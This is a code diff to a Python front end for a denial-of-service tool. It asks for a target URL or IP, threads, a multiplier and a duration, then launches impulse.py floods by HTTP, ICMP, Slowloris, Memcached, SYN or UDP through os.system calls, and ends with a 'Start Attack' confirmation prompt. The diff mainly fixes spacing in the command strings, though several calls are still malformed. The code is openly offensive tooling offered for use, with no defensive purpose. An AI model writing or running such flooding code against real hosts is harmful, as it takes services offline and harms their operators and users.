@@ -76,37 +76,37 @@ print(Fore.RED + logo + Fore.BLUE)
 
 ip = input(Fore.CYAN+"  URL/IP : "+Fore.WHITE)
 
-threadcount = input(Fore.CYAN+"How many threads (1-300): ")
+threadcount = input(Fore.CYAN+"  How many threads (1-300): ")
 
 count = input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE)
 
-length = input(Fore.CYAN+"How long to hit (Seconds): ")
+length = input(Fore.CYAN+"  How long to hit (Seconds): ")
 
-hitmethod = input(Fore.CYAN+"Method (HTTP, ICMP, SLOWLORIS, MEMCACHED, SYN, UDP): ")
+hitmethod = input(Fore.CYAN+"  Method (HTTP, ICMP, SLOWLORIS, MEMCACHED, SYN, UDP): ")
 
 def http():
   print("  Starting Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method HTTP")
+  os.system("python3.9 impulse.py --target "+ip+":80"+ " --time "+ length+" --threads "+threadcount+" --method HTTP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def icmp():
   print("  Starting Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method ICMP")
+  os.system("python3.9 impulse.py --target "+ip+":80"+" --time"+length+" --threads"+threadcount+" --method ICMP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def slowloris():
   print("  Starting Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method SLOWLORIS")
+  os.system("python3.9 impulse.py --target "+ip+":80"+" --time"+length+" --threads"+threadcount+" --method SLOWLORIS")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def memcached():
   print("  Starting Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method MEMCACHED")
+  os.system("python3.9 impulse.py --target "+ip+":80"+" --time"+length+" --threads"+threadcount+" --method MEMCACHED")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def syn():
   print("  Starting Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":80"+"--time"+length+"--threads"+threadcount+"--method SYN")
+  os.system("python3.9 impulse.py --target "+ip+":80"+" --time"+length+" --threads"+threadcount+" --method SYN")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def udp():
   print("  Starting Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":53"+"--time"+length+"--threads"+threadcount+"--method UDP")
+  os.system("python3.9 impulse.py --target "+ip+":53"+" --time"+length+" --threads"+threadcount+" --method UDP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 
 yesno = input(Fore.RED+"  Start Attack On "+ip+" With "+count+"x Multiplier"+"? Y/N: ")
